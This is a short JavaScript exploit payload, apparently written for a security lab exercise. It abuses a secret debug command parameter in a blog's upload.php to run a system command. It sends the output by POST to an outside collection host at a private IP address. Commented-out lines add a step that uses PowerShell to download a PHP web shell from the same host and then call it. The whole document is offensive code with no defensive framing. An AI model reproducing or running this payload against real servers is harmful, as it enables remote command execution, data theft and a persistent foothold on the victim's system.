path = "http://localhost:800/blog/upload.php?debugcommandSecret=Subscribe2SecAura:)&debugcommandLineParameter="
rce = "dir"


fetch(path + rce).then(function (response) {

	return response.text();
}).then(function (html) {
    fetch("http://192.168.153.128:8000/content", {
            body: "url=" + encodeURIComponent("rce") + "&content=" + encodeURIComponent(html),
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            method: "POST"
        })
}).catch(function (err) {
	// There was an error
	console.warn('Something went wrong.', err);
});



// Reverse shell
//fetch("http://localhost:800/blog/upload.php?debugcommandSecret=Subscribe2SecAura:)&debugcommandLineParameter=powershell -c invoke-webrequest -Uri http://192.168.153.128:9000/shell.php -OutFile shell.php");
// fetch("http://localhost:800/blog/shell.php");
